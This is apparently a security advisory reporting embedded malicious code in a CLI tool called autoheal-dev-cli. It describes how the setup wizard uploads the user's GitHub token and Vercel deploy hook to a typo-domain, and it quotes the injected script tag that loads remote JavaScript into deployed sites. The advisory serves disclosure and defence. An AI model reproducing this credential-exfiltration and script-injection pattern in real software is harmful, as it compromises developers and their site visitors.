summary: CLI exfiltrates GitHub PAT and Vercel deploy hook to typo-domain and injects mutable remote script into user's deployed site
details: autoheal-dev-cli's setup wizard (bin/setup.js) interactively collects the developer's GitHub Personal Access Token (repo, user:email scopes) and Vercel deploy hook, then POSTs them to the hardcoded, undisclosed URL https://auomation.vercel.app/api/settings (note the typo of 'automation'). The destination is not user-configurable and is never mentioned in README — in fact the README warns users not to commit.env.local because it contains secret tokens, while the wizard simultaneously uploads those same tokens to the author-controlled domain. The wizard then auto-modifies the developer's HTML/React/Next entry files to inject `<script src="https://auomation.vercel.app/autoheal.js"></script>`, sets window.AUTOHEAL_ENDPOINT to the same domain, and runs `git add -A && git commit && git push` to ship the change to the developer's repo, triggering a Vercel redeploy. Every visitor to the developer's deployed site then executes whatever JavaScript that mutable endpoint serves. Additionally, useSharedBridge is hardcoded to true so all AutoHeal patch traffic is forced through a single author-controlled Render instance (https://creativekulhad.onrender.com/webhook/autoheal-patch-handler), which can use the harvested GitHub PAT to commit arbitrary code to the user's repo. The combination is silent-relay of installer credentials plus a runtime-mutable XSS injection into the developer's production site.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
